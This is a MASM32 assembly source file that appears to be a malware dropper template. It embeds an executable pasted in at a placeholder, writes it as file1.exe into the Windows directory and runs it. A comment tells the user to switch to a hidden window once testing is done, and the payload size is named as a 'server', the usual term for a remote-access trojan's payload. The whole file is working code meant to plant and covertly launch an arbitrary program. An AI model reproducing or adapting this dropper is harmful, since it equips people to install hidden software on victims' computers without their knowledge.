.386
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\shell32.inc
include \masm32\include\advapi32.inc
 
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib 
includelib \masm32\lib\advapi32.lib

.data?
  windir      db 256 dup(?)

.data
; extracts to windows
  filename        db  'file1.exe',0

; ---------------------------------------------------------------------------
; run bintodb in your masm32 folder
; copy n paste the result here

;start db here like this---- file    db bla
; ***********************************************

PASTE IT HERE


; ***********************************************
; ---------------------------------------------------------------------------
; end file 1

 
YOUR_SERVER_SIZE equ $-file

.code
start proc
    LOCAL hFile:DWORD
    LOCAL nBytesWritten:DWORD
    invoke GetWindowsDirectory, addr windir, sizeof windir
    invoke SetCurrentDirectory, addr windir
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;file1   
    invoke CreateFile,addr filename,GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_ARCHIVE,NULL
    mov [hFile],eax
    invoke WriteFile,hFile,addr file,YOUR_SERVER_SIZE,addr nBytesWritten,NULL
    invoke CloseHandle,hFile
    invoke WinExec, addr filename, SW_SHOW
    ; change these to SW_HIDE after done testing to run hidden

    invoke ExitProcess,eax
    ret
start endp
end start

